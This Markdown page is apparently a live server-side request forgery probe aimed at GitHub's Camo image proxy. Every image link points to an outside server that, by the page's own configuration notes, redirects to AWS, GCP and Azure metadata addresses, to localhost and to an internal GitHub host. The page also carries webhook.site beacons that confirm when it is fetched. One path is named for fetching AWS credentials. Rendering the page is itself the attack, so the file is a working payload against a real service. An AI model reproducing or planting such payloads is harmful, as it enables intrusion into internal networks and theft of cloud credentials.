# v50: 302 Redirect SSRF Attack - Port 7777

> **CRITICAL TEST**: Server at `164.90.187.218.nip.io:7777` returns 302 redirects to internal targets.
> If Camo follows these redirects → **SSRF VULNERABILITY**!

---

## 1. Redirect to AWS Metadata (169.254.169.254)

### AWS Metadata via redirect
![aws-redir](http://164.90.187.218.nip.io:7777/aws-metadata.gif)

### AWS with different path
![aws2](http://164.90.187.218.nip.io:7777/fetch-aws-creds.gif)

---

## 2. Redirect to localhost/127.0.0.1

### Localhost redirect
![local](http://164.90.187.218.nip.io:7777/local-test.gif)

### 127.0.0.1 direct
![127](http://164.90.187.218.nip.io:7777/local-127.gif)

---

## 3. Redirect to Internal Hostnames

### internal.github.com
![github-internal](http://164.90.187.218.nip.io:7777/github-internal.gif)

---

## 4. Redirect to Other Cloud Metadata

### GCP metadata (169.254.169.254 or metadata.google.internal)
![gcp](http://164.90.187.218.nip.io:7777/aws-gcp.gif)

### Azure metadata (169.254.169.254)
![azure](http://164.90.187.218.nip.io:7777/aws-azure.gif)

---

## 5. Control Tests

### Redirect to webhook.site (should work)
![webhook-redir](http://164.90.187.218.nip.io:7777/test-webhook.gif)

### Direct webhook.site control
![control](https://webhook.site/1873d398-52fb-46cf-b86a-d4aa58c4ad9d/v50-control.gif)

---

## Server Configuration

Server at `164.90.187.218:7777` returns 302 redirects:
- `/aws*` → `http://169.254.169.254/latest/meta-data/`
- `/local*` → `http://127.0.0.1/`
- `/github*` → `http://internal.github.com/`
- `/*` → `http://webhook.site/redirect-success`

---

**v50** - Testing if Camo follows 302 redirects to internal targets (SSRF)
